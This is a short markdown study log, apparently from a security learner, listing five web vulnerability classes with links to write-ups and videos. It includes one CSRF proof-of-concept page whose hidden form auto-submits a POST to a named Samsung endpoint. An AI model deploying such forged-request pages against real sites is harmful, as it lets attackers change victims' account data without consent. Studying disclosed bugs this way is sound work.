## Documentation for 5 bugs

- The 5 bugs I have chosen to research more about are:

1. [x] __SSRF__

2. [x] __CSRF__

3. [x] __Arbitrary File Upload__

4. [x] __Path Traversal__

5. [x] __IDOR__

<br>
<br>


### 1. SSRF

- Watched [this](https://youtu.be/90AdmqqPo1Y?si=dda0_--GGKOiUgVX) video on SSRF.

<br>
<br>

### 2. CSRF

- writeup : [samsung-scsrf-2022](https://web.archive.org/web/20221005153610/https://bloggerrando.blogspot.com/2022/08/17-1.html)

- poc: [yt](https://youtu.be/Res3bI49wGE?si=MgC7Tm2mkdsK6aC3)

- Attacker controlled website:

```html
<form action="https://security.samsungmobile.com/saveMyRewardInfo.smsr" method="POST" name="hiSamsung">
    <input type="hidden" name="userName" value="Testing by Ando">
    <input type="hidden" name="rewardName" value="Testing by Ando">
</form>
<script>
hiSamsung.submit()
</script>
```

<br>
<br>


### 3. Arbitrary File Uploads

1. read this [writeup](https://shahjerry33.medium.com/sql-injection-the-file-upload-playground-6580b089d013)

- allowed SQLi and XSS just via file upload due to improper file name validations.

2.  read this file upload writeup as well [here](https://labs.jumpsec.com/quest-kace-desktop-authority-pre-auth-remote-code-execution-cve-2021-44031/)

<br>
<br>

### 4. Path Traversal

- read about a critical path traversal in Xstore Suite of Oracle. [here](https://www.synacktiv.com/advisories/oracle-retail-xstore-suite-pre-authenticated-path-traversal)

<br>
<br>

### 5. IDOR - Insecure Direct Object Reference

- read this __TikTok Now__ IDOR [here](https://medium.com/@mrhavit/how-i-found-an-insecure-direct-object-reference-in-tiktok-c7303addf223)

